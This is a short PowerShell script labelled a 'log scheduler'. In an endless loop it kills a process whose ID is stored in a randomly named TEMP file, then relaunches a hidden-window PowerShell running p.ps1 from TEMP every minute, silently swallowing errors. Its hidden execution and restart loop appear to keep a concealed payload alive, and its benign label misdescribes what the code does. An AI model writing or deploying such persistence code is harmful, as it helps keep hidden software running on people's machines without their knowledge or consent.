# powershell log scheduler
# created by: C0SM0

for(;;) {
    try {
        # invoke the worker script
        $proc = Get-Content "$env:TEMP\DdBPKCytRe"
        Stop-Process -Id $proc -Force
        powershell Start-Process powershell.exe -WindowStyle Hidden "$env:TEMP\p.ps1"
    }
    catch {
        # do something with $_, log it, more likely
    }
   
    # wait for a minute
    Start-Sleep 60
}
